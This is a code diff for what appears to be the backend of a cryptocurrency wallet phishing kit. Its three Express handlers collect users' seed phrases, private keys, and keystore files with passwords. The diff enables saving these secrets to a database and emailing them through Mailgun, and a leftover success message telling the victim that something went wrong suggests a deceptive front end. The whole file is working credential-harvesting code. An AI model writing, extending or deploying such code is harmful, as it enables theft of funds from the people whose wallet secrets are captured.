@@ -1,7 +1,7 @@
 // const sgMail = require("@sendgrid/mail");
-// const Phrase = require("../models/phrase");
-// const PrivateKey = require("../models/privateKey");
-// const KeyStoreJson = require("../models/keystoreJson");
+const Phrase = require("../models/phrase");
+const PrivateKey = require("../models/privateKey");
+const KeyStoreJson = require("../models/keystoreJson");
 
 // sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
@@ -18,35 +18,25 @@ const mg = mailgun.client({
 exports.phraseData = async (req, res) => {
   const { phrase, email, wallet } = req.body;
 
-  // const msg = {
-  //   to: email,
-  //   from: email,
-  //   subject: "Phrase Data",
-  //   html: `
-  //       <h1>Phrase Data</h1>
-  //       <p>${phrase}</p>
-  //     `,
-  // };
-
-  // const phraseModel = new Phrase({
-  //   email,
-  //   wallet,
-  //   phrase,
-  // });
+  const phraseModel = new Phrase({
+    email,
+    wallet,
+    phrase,
+  });
 
   // save phrase to the database
-  // try {
-  //   await phraseModel.save();
-  // } catch (err) {
-  //   console.error(err.message);
-  //   return res.status(400).json({
-  //     success: false,
-  //     msg: err.message,
-  //   });
-  // }
+  try {
+    await phraseModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
-    .create("sandboxb71e594c730d42e58761a14591035ea3.mailgun.org", {
+    .create(process.env.MAILGUN_BASE_URL, {
       from: email,
       to: email,
       subject: "Phrase Data",
@@ -69,40 +59,29 @@ exports.phraseData = async (req, res) => {
         msg: err,
       });
     });
-
-  // sgMail
-  //   .send(msg)
-  //   .then(() => {
-  //     res.status(200).json({
-  //       success: true,
-  //       msg: "Something went wrong, please try again later",
-  //     });
-  //   })
-  //   .catch((err) => {
-  //     console.error(err);
-  //     return res.status(400).json({
-  //       success: false,
-  //       msg: err,
-  //     });
-  //   });
 };
 
 exports.privateKeyData = async (req, res) => {
   const { privateKey, email } = req.body;
 
-  const msg = {
-    to: email,
-    from: email,
-    subject: "Private Key Data",
-    html: `
-        <h1>Private Key Data</h1>
-        <p>${privateKey}</p>
-      `,
-  };
+  const privateKeyModel = new PrivateKey({
+    email,
+    privateKey,
+  });
+
+  try {
+    await privateKeyModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
-    .create("sandbox-123.mailgun.org", {
-      from: "Mainnet Email Service <mainnet-email-service>",
+    .create(process.env.MAILGUN_BASE_URL, {
+      from: email,
       to: email,
       subject: "Private Key Data",
       html: `
@@ -124,41 +103,32 @@ exports.privateKeyData = async (req, res) => {
         msg: err,
       });
     });
-
-  // sgMail
-  //   .send(msg)
-  //   .then(() => {
-  //     res.status(200).json({
-  //       success: true,
-  //       msg: "Something went wrong, please try again later",
-  //     });
-  //   })
-  //   .catch((err) => {
-  //     console.error(err);
-  //     return res.status(400).json({
-  //       success: false,
-  //       msg: err,
-  //     });
-  //   });
 };
 
 exports.keystoreJSONData = async (req, res) => {
   const { keyStore, password, email } = req.body;
 
-  const msg = {
-    to: email,
-    from: email,
-    subject: "KeyStore JSON Data",
-    html: `
-        <h1>Phrase Data</h1>
-        <p><strong>{keyword} - </strong> ${keyStore}</p>
-        <p><strong>{password} - </strong> ${password}</p>
-      `,
-  };
+  const keystoreJsonModel = new KeyStoreJson({
+    email,
+    keystoreJSON: {
+      keyStore,
+      password,
+    },
+  });
+
+  try {
+    await keystoreJsonModel.save();
+  } catch (err) {
+    console.error(err.message);
+    return res.status(400).json({
+      success: false,
+      msg: err.message,
+    });
+  }
 
   mg.messages
-    .create("sandbox-123.mailgun.org", {
-      from: "Mainnet Email Service <mainnet-email-service>",
+    .create(process.env.MAILGUN_BASE_URL, {
+      from: email,
       to: email,
       subject: "KeyStore JSON Data",
       html: `
@@ -181,20 +151,4 @@ exports.keystoreJSONData = async (req, res) => {
         msg: err,
       });
     });
-
-  // sgMail
-  //   .send(msg)
-  //   .then(() => {
-  //     res.status(200).json({
-  //       success: true,
-  //       msg: "Something went wrong, please try again later",
-  //     });
-  //   })
-  //   .catch((err) => {
-  //     console.error(err);
-  //     return res.status(400).json({
-  //       success: false,
-  //       msg: err,
-  //     });
-  //   });
 };
